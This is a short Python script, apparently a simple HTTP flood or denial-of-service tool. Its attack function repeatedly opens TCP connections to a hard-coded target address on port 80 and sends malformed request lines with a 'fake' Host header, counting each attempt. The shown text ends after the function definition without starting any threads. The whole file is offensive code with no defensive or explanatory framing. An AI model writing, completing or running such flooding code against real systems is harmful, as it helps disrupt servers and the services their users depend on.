import socket
import threading
target = '192.168.100.1'
fake_ip = '182.21.20.32'
port = 80
attack_num = 0
def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("Get /" + target + " HTTP/1.1\r\n").encode('ascii'),(target,port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'),(target,port))
        s.close()
        global attack_num
        attack_num += 1
        print(attack_num)
        

        
       
        
